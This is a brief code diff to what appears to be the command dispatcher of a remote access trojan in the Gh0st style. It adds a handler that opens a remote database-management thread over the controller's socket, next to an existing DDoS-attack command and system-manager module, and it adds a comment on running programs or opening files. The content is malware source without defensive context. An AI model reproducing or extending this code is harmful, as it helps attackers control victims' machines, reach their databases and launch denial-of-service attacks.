@@ -137,6 +137,10 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;		
+	case COMMAND_SQL:				// 数据库管理
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DataBaseManager,
+			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		break;
 	case COMMAND_DDOS_ATTACK:       //DOSS
 		{
 			ATTACK m_Attack;
@@ -300,6 +304,7 @@ bool CKernelManager::IsActived()
 	return	m_bIsActived;	
 }
 
+//运行程序或打开文件
 BOOL CKernelManager::OpenFile(const void *filedata, UINT size, INT nShowCmd)
 {
 	char	lpSubKey[500];
